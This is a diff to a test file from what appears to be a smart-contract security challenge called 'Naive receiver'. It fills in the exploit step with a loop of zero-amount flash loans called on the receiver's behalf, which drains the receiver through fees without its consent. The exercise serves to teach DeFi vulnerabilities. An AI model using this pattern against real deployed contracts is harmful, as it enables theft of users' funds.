@@ -31,11 +31,8 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('100'))
-        let pool_balance = await ethers.provider.getBalance(this.pool.address)
-        console.log('Pool', ethers.utils.formatEther(pool_balance))
-        let receiver_balance = await ethers.provider.getBalance(this.receiver.address)
-        console.log('Receiver', ethers.utils.formatEther(receiver_balance))
+        // Ridiculous, pool can force unwanted lending without approval of receiver
+        for(i = 0 ; i < 10 ; i ++) await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
     });
 
     after(async function () {
